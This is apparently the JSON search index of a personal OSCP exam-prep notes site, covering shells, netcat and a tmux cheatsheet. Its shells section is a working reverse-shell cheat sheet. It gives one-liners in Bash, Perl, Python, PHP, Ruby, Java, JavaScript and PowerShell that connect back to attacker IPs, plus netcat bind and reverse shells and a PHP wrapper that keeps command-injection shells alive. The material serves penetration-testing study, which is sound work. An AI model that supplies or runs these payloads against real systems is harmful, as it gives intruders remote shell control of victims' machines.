{"config":{"lang":["en"],"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"OSCP Notes","title":"OSCP Notes"},{"location":"#oscp-notes","text":"","title":"OSCP Notes"},{"location":"about/","text":"About The main purpose of this site is to compile all the OSCP prep resources I find useful in one place.","title":"About"},{"location":"about/#about","text":"The main purpose of this site is to compile all the OSCP prep resources I find useful in one place.","title":"About"},{"location":"enumeration/","text":"SMPT SNMP NetBios SQL","title":"Enumeration"},{"location":"enumeration/#smpt","text":"","title":"SMPT"},{"location":"enumeration/#snmp","text":"","title":"SNMP"},{"location":"enumeration/#netbios","text":"","title":"NetBios"},{"location":"enumeration/#sql","text":"","title":"SQL"},{"location":"privesc/","text":"Linux Windows Source: https://github.com/frizb/Windows-Privilege-Escalation Updated 22 July 2019","title":"Privesc"},{"location":"privesc/#linux","text":"","title":"Linux"},{"location":"privesc/#windows","text":"Source: https://github.com/frizb/Windows-Privilege-Escalation Updated 22 July 2019","title":"Windows"},{"location":"shells/","text":"Find out which programs are installed for item in $(echo nmap nc perl python ruby gcc wget sudo curl ); do which $item; done` Bash bash -i /dev/tcp/10.0.0.1/8080 0 1 Perl perl -e 'use Socket;$i= 10.0.0.1 ;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname( tcp ));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, S );open(STDOUT, S );open(STDERR, S );exec( /bin/sh -i );};' Python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( 10.0.0.1 ,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ /bin/sh , -i ]);' PHP My favorite web shell: p0wny-shell php -r '$sock=fsockopen( 10.0.0.1 ,1234);exec( /bin/sh -i 3 3 2 3 );' For those situations when a PHP command injection shell spawns and immediately dies, this will run in the background: function execInBackground($cmd) { if (substr(php_uname(), 0, 7) == Windows ){ pclose(popen( start /B . $cmd, r )); } else { exec($cmd . /dev/null ); } } execInBackground( /bin/bash -c 'bash -i /dev/tcp/192.168.1.221/8081 0 1' ); Ruby ruby -rsocket -e'f=TCPSocket.open( 10.0.0.1 ,1234).to_i;exec sprintf( /bin/sh -i %d %d 2 %d ,f,f,f)' Netcat nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc 10.0.0.1 1234 /tmp/f Java r = Runtime.getRuntime() p = r.exec([ /bin/bash , -c , exec 5 /dev/tcp/10.0.0.1/2002;cat 5 | while read line; do \\$line 2 5 5; done ] as String[]) p.waitFor() JavaScript var spawn = require('child_process').spawn; var net = require('net'); var reconnect = require('reconnect'); reconnect(function (stream) { var ps = spawn('bash', [ '-i' ]); stream.pipe(ps.stdin); ps.stdout.pipe(stream, { end: false }); ps.stderr.pipe(stream, { end: false }); ps.on('exit', function () { stream.end() }); }).connect(5500, '192.168.60.124'); require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]') xterm One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001. xterm -display 10.0.0.1:1 To catch the incoming xterm, start an X-Server (:1 \u2013 which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system): Xnest :1 You\u2019ll need to authorize the target to connect to you (command also run on your host): xhost +targetip Powershell Reverse Shell (Inside Powershell.exe) $client = New-Object System.Net.Sockets.TCPClient( 127.0.0.1 ,8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + PS + (pwd).Path + ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() Powershell Reverse Shell (Inside cmd) powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + ' ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() Upgrading Shells python -c 'import pty; pty.spawn(\"/bin/bash\")' Background shell with Ctrl+Z echo $TERM tput lines tput cols - (note this, it will disappear) stty raw -echo fg reset export SHELL=bash export TERM=xterm-256color - (refer to step 3) stty rows 38 columns 116 - (refer to step 3) Sources: pentestmonkey NaviSec Delta","title":"Shells"},{"location":"shells/#find-out-which-programs-are-installed","text":"for item in $(echo nmap nc perl python ruby gcc wget sudo curl ); do which $item; done`","title":"Find out which programs are installed"},{"location":"shells/#bash","text":"bash -i /dev/tcp/10.0.0.1/8080 0 1","title":"Bash"},{"location":"shells/#perl","text":"perl -e 'use Socket;$i= 10.0.0.1 ;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname( tcp ));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN, S );open(STDOUT, S );open(STDERR, S );exec( /bin/sh -i );};'","title":"Perl"},{"location":"shells/#python","text":"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( 10.0.0.1 ,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ /bin/sh , -i ]);'","title":"Python"},{"location":"shells/#php","text":"My favorite web shell: p0wny-shell php -r '$sock=fsockopen( 10.0.0.1 ,1234);exec( /bin/sh -i 3 3 2 3 );' For those situations when a PHP command injection shell spawns and immediately dies, this will run in the background: function execInBackground($cmd) { if (substr(php_uname(), 0, 7) == Windows ){ pclose(popen( start /B . $cmd, r )); } else { exec($cmd . /dev/null ); } } execInBackground( /bin/bash -c 'bash -i /dev/tcp/192.168.1.221/8081 0 1' );","title":"PHP"},{"location":"shells/#ruby","text":"ruby -rsocket -e'f=TCPSocket.open( 10.0.0.1 ,1234).to_i;exec sprintf( /bin/sh -i %d %d 2 %d ,f,f,f)'","title":"Ruby"},{"location":"shells/#netcat","text":"nc -e /bin/sh 10.0.0.1 1234 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2 1|nc 10.0.0.1 1234 /tmp/f","title":"Netcat"},{"location":"shells/#java","text":"r = Runtime.getRuntime() p = r.exec([ /bin/bash , -c , exec 5 /dev/tcp/10.0.0.1/2002;cat 5 | while read line; do \\$line 2 5 5; done ] as String[]) p.waitFor()","title":"Java"},{"location":"shells/#javascript","text":"var spawn = require('child_process').spawn; var net = require('net'); var reconnect = require('reconnect'); reconnect(function (stream) { var ps = spawn('bash', [ '-i' ]); stream.pipe(ps.stdin); ps.stdout.pipe(stream, { end: false }); ps.stderr.pipe(stream, { end: false }); ps.on('exit', function () { stream.end() }); }).connect(5500, '192.168.60.124'); require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')","title":"JavaScript"},{"location":"shells/#xterm","text":"One of the simplest forms of reverse shell is an xterm session. The following command should be run on the server. It will try to connect back to you (10.0.0.1) on TCP port 6001. xterm -display 10.0.0.1:1 To catch the incoming xterm, start an X-Server (:1 \u2013 which listens on TCP port 6001). One way to do this is with Xnest (to be run on your system): Xnest :1 You\u2019ll need to authorize the target to connect to you (command also run on your host): xhost +targetip","title":"xterm"},{"location":"shells/#powershell-reverse-shell-inside-powershellexe","text":"$client = New-Object System.Net.Sockets.TCPClient( 127.0.0.1 ,8000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + PS + (pwd).Path + ;$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()","title":"Powershell Reverse Shell (Inside Powershell.exe)"},{"location":"shells/#powershell-reverse-shell-inside-cmd","text":"powershell -nop -c $client = New-Object System.Net.Sockets.TCPClient('127.0.0.1',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2 1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + ' ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()","title":"Powershell Reverse Shell (Inside cmd)"},{"location":"shells/#upgrading-shells","text":"python -c 'import pty; pty.spawn(\"/bin/bash\")' Background shell with Ctrl+Z echo $TERM tput lines tput cols - (note this, it will disappear) stty raw -echo fg reset export SHELL=bash export TERM=xterm-256color - (refer to step 3) stty rows 38 columns 116 - (refer to step 3) Sources: pentestmonkey NaviSec Delta","title":"Upgrading Shells"},{"location":"tools/","text":"Scripts LinEnum.sh hydra Netcat nmap sparta tmux","title":"Tools"},{"location":"tools/#scripts","text":"","title":"Scripts"},{"location":"tools/#linenumsh","text":"","title":"LinEnum.sh"},{"location":"tools/#hydra","text":"","title":"hydra"},{"location":"tools/#netcat","text":"","title":"Netcat"},{"location":"tools/#nmap","text":"","title":"nmap"},{"location":"tools/#sparta","text":"","title":"sparta"},{"location":"tools/#tmux","text":"","title":"tmux"},{"location":"useful links/","text":"Reddit https://www.reddit.com/r/oscp/ Blogs https://highon.coffee/ https://www.gnucitizen.org/ https://potatofrom.space/ https://blog.ropnop.com/ Techniques https://0x00sec.org/ https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html https://netsec.ws/ http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ https://delta.navisec.io/reverse-shell-reference/#upgrading-shells https://github.com/frizb/Windows-Privilege-Escalation News https://news.ycombinator.com/ Tutorials IppSec","title":"Useful Links"},{"location":"useful links/#reddit","text":"https://www.reddit.com/r/oscp/","title":"Reddit"},{"location":"useful links/#blogs","text":"https://highon.coffee/ https://www.gnucitizen.org/ https://potatofrom.space/ https://blog.ropnop.com/","title":"Blogs"},{"location":"useful links/#techniques","text":"https://0x00sec.org/ https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html https://netsec.ws/ http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/ https://delta.navisec.io/reverse-shell-reference/#upgrading-shells https://github.com/frizb/Windows-Privilege-Escalation","title":"Techniques"},{"location":"useful links/#news","text":"https://news.ycombinator.com/","title":"News"},{"location":"useful links/#tutorials","text":"IppSec","title":"Tutorials"},{"location":"tools/hydra/","text":"","title":"Hydra"},{"location":"tools/metasploit/","text":"","title":"Metasploit"},{"location":"tools/netcat/","text":"General Listener Unless otherwise noted, most of these will require an established listener: nc -nvlp 1337 Transfer a file Sender nc -nv IP Address input.txt Recipient nc -lvp 4444 output.txt Set up a Netcat Bind Shell (Windows) nc -lvp 4444 -e cmd.exe Set up a Netcat Bind Shell (Linux) nc -lvp 4444 -e /bin/sh Set up a Netcat Reverse Shell (Windows) nc -nv IP Address 443 -e cmd.exe Set up a Netcat Reverse Shell (Linux) nc -nv IP Address 443 -e /bin/sh Netcat as a Port Scanner nc -z IP Address Port Range in abc - xyz format Netcat as a Banner Grabber echo | nc -nv -w1 IP Address Ports Sources : Netsec","title":"General Listener"},{"location":"tools/netcat/#general-listener","text":"Unless otherwise noted, most of these will require an established listener: nc -nvlp 1337","title":"General Listener"},{"location":"tools/netcat/#transfer-a-file","text":"Sender nc -nv IP Address input.txt Recipient nc -lvp 4444 output.txt","title":"Transfer a file"},{"location":"tools/netcat/#set-up-a-netcat-bind-shell-windows","text":"nc -lvp 4444 -e cmd.exe","title":"Set up a Netcat Bind Shell (Windows)"},{"location":"tools/netcat/#set-up-a-netcat-bind-shell-linux","text":"nc -lvp 4444 -e /bin/sh","title":"Set up a Netcat Bind Shell (Linux)"},{"location":"tools/netcat/#set-up-a-netcat-reverse-shell-windows","text":"nc -nv IP Address 443 -e cmd.exe","title":"Set up a Netcat Reverse Shell (Windows)"},{"location":"tools/netcat/#set-up-a-netcat-reverse-shell-linux","text":"nc -nv IP Address 443 -e /bin/sh","title":"Set up a Netcat Reverse Shell (Linux)"},{"location":"tools/netcat/#netcat-as-a-port-scanner","text":"nc -z IP Address Port Range in abc - xyz format","title":"Netcat as a Port Scanner"},{"location":"tools/netcat/#netcat-as-a-banner-grabber","text":"echo | nc -nv -w1 IP Address Ports Sources : Netsec","title":"Netcat as a Banner Grabber"},{"location":"tools/nmap/","text":"","title":"Nmap"},{"location":"tools/tmux/","text":"tmux Shortcuts Cheatsheet Start new: tmux Start new with session name: tmux new -s myname Attach: tmux a # (or at, or attach) Attach to named: tmux a -t myname List sessions: tmux ls kill session: tmux kill-session -t myname Kill all the tmux sessions: tmux ls | grep : | cut -d. -f1 | awk '{print substr($1, 0, length($1)-1)}' | xargs kill In tmux, hit the prefix ctrl+b (my modified prefix is ctrl+a) and then: Sessions :new CR new session s list sessions $ name session Windows (tabs) c create window w list windows n next window p previous window f find window , name window kill window Panes (splits) % vertical split \" horizontal split o swap panes q show pane numbers x kill pane + break pane into window (e.g. to select text by mouse to copy) - restore pane from window \u237d space - toggle between layouts prefix q (Show pane numbers, when the numbers show up type the key to goto that pane) prefix { (Move the current pane left) prefix } (Move the current pane right) prefix z toggle pane zoom Sync Panes You can do this by switching to the appropriate window, typing your Tmux prefix (commonly Ctrl-B or Ctrl-A) and then a colon to bring up a Tmux command line, and typing: :setw synchronize-panes You can optionally add on or off to specify which state you want; otherwise the option is simply toggled. This option is specific to one window, so it won\u2019t change the way your other sessions or windows operate. When you\u2019re done, toggle it off again by repeating the command. tip source Resizing Panes You can also resize panes if you don\u2019t like the layout defaults. I personally rarely need to do this, though it\u2019s handy to know how. Here is the basic syntax to resize panes: PREFIX : resize-pane -D (Resizes the current pane down) PREFIX : resize-pane -U (Resizes the current pane upward) PREFIX : resize-pane -L (Resizes the current pane left) PREFIX : resize-pane -R (Resizes the current pane right) PREFIX : resize-pane -D 20 (Resizes the current pane down by 20 cells) PREFIX : resize-pane -U 20 (Resizes the current pane upward by 20 cells) PREFIX : resize-pane -L 20 (Resizes the current pane left by 20 cells) PREFIX : resize-pane -R 20 (Resizes the current pane right by 20 cells) PREFIX : resize-pane -t 2 20 (Resizes the pane with the id of 2 down by 20 cells) PREFIX : resize-pane -t -L 20 (Resizes the pane with the id of 2 left by 20 cells) Copy mode: Pressing PREFIX [ places us in Copy mode. We can then use our movement keys to move our cursor around the screen. By default, the arrow keys work. we set our configuration file to use Vim keys for moving between windows and resizing panes so we wouldn\u2019t have to take our hands off the home row. tmux has a vi mode for working with the buffer as well. To enable it, add this line to .tmux.conf: setw -g mode-keys vi With this option set, we can use h, j, k, and l to move around our buffer. To get out of Copy mode, we just press the ENTER key. Moving around one character at a time isn\u2019t very efficient. Since we enabled vi mode, we can also use some other visible shortcuts to move around the buffer. For example, we can use \"w\" to jump to the next word and \"b\" to jump back one word. And we can use \"f\", followed by any character, to jump to that character on the same line, and \"F\" to jump backwards on the line. Function vi emacs Back to indentation ^ M-m Clear selection Escape C-g Copy selection Enter M-w Cursor down j Down Cursor left h Left Cursor right l Right Cursor to bottom line L Cursor to middle line M M-r Cursor to top line H M-R Cursor up k Up Delete entire line d C-u Delete to end of line D C-k End of line $ C-e Goto line : g Half page down C-d M-Down Half page up C-u M-Up Next page C-f Page down Next word w M-f Paste buffer p C-y Previous page C-b Page up Previous word b M-b Quit mode q Escape Scroll down C-Down or J C-Down Scroll up C-Up or K C-Up Search again n n Search backward ? C-r Search forward / C-s Start of line 0 C-a Start selection Space C-Space Transpose chars C-t Misc d detach t big clock ? list shortcuts : prompt Configurations Options: # Mouse support - set to on if you want to use the mouse * setw -g mode-mouse off * set -g mouse-select-pane off * set -g mouse-resize-pane off * set -g mouse-select-window off # Set the default terminal mode to 256color mode set -g default-terminal \"screen-256color\" # enable activity alerts setw -g monitor-activity on set -g visual-activity on # Center the window list set -g status-justify centre # Maximize and restore a pane unbind Up bind Up new-window -d -n tmp \\; swap-pane -s tmp.1 \\; select-window -t tmp unbind Down bind Down last-window \\; swap-pane -s tmp.1 \\; kill-window -t tmp Resources: tmux: Productive Mouse-Free Development How to reorder windows Source: https://gist.github.com/MohamedAlaa/2961058 Updated 22 July 2019","title":"tmux Shortcuts & Cheatsheet"},{"location":"tools/tmux/#tmux-shortcuts-cheatsheet","text":"Start new: tmux Start new with session name: tmux new -s myname Attach: tmux a # (or at, or attach) Attach to named: tmux a -t myname List sessions: tmux ls kill session: tmux kill-session -t myname Kill all the tmux sessions: tmux ls | grep : | cut -d. -f1 | awk '{print substr($1, 0, length($1)-1)}' | xargs kill In tmux, hit the prefix ctrl+b (my modified prefix is ctrl+a) and then:","title":"tmux Shortcuts &amp; Cheatsheet"},{"location":"tools/tmux/#sessions","text":":new CR new session s list sessions $ name session","title":"Sessions"},{"location":"tools/tmux/#resizing-panes","text":"You can also resize panes if you don\u2019t like the layout defaults. I personally rarely need to do this, though it\u2019s handy to know how. Here is the basic syntax to resize panes: PREFIX : resize-pane -D (Resizes the current pane down) PREFIX : resize-pane -U (Resizes the current pane upward) PREFIX : resize-pane -L (Resizes the current pane left) PREFIX : resize-pane -R (Resizes the current pane right) PREFIX : resize-pane -D 20 (Resizes the current pane down by 20 cells) PREFIX : resize-pane -U 20 (Resizes the current pane upward by 20 cells) PREFIX : resize-pane -L 20 (Resizes the current pane left by 20 cells) PREFIX : resize-pane -R 20 (Resizes the current pane right by 20 cells) PREFIX : resize-pane -t 2 20 (Resizes the pane with the id of 2 down by 20 cells) PREFIX : resize-pane -t -L 20 (Resizes the pane with the id of 2 left by 20 cells)","title":"Resizing Panes"},{"location":"tools/tmux/#copy-mode","text":"Pressing PREFIX [ places us in Copy mode. We can then use our movement keys to move our cursor around the screen. By default, the arrow keys work. we set our configuration file to use Vim keys for moving between windows and resizing panes so we wouldn\u2019t have to take our hands off the home row. tmux has a vi mode for working with the buffer as well. To enable it, add this line to .tmux.conf: setw -g mode-keys vi With this option set, we can use h, j, k, and l to move around our buffer. To get out of Copy mode, we just press the ENTER key. Moving around one character at a time isn\u2019t very efficient. Since we enabled vi mode, we can also use some other visible shortcuts to move around the buffer. For example, we can use \"w\" to jump to the next word and \"b\" to jump back one word. And we can use \"f\", followed by any character, to jump to that character on the same line, and \"F\" to jump backwards on the line. Function vi emacs Back to indentation ^ M-m Clear selection Escape C-g Copy selection Enter M-w Cursor down j Down Cursor left h Left Cursor right l Right Cursor to bottom line L Cursor to middle line M M-r Cursor to top line H M-R Cursor up k Up Delete entire line d C-u Delete to end of line D C-k End of line $ C-e Goto line : g Half page down C-d M-Down Half page up C-u M-Up Next page C-f Page down Next word w M-f Paste buffer p C-y Previous page C-b Page up Previous word b M-b Quit mode q Escape Scroll down C-Down or J C-Down Scroll up C-Up or K C-Up Search again n n Search backward ? C-r Search forward / C-s Start of line 0 C-a Start selection Space C-Space Transpose chars C-t","title":"Copy mode:"},{"location":"tools/tmux/#misc","text":"d detach t big clock ? list shortcuts : prompt","title":"Misc"},{"location":"tools/tmux/#configurations-options","text":"# Mouse support - set to on if you want to use the mouse * setw -g mode-mouse off * set -g mouse-select-pane off * set -g mouse-resize-pane off * set -g mouse-select-window off # Set the default terminal mode to 256color mode set -g default-terminal \"screen-256color\" # enable activity alerts setw -g monitor-activity on set -g visual-activity on # Center the window list set -g status-justify centre # Maximize and restore a pane unbind Up bind Up new-window -d -n tmp \\; swap-pane -s tmp.1 \\; select-window -t tmp unbind Down bind Down last-window \\; swap-pane -s tmp.1 \\; kill-window -t tmp","title":"Configurations Options:"},{"location":"tools/tmux/#resources","text":"tmux: Productive Mouse-Free Development How to reorder windows Source: https://gist.github.com/MohamedAlaa/2961058 Updated 22 July 2019","title":"Resources:"}]}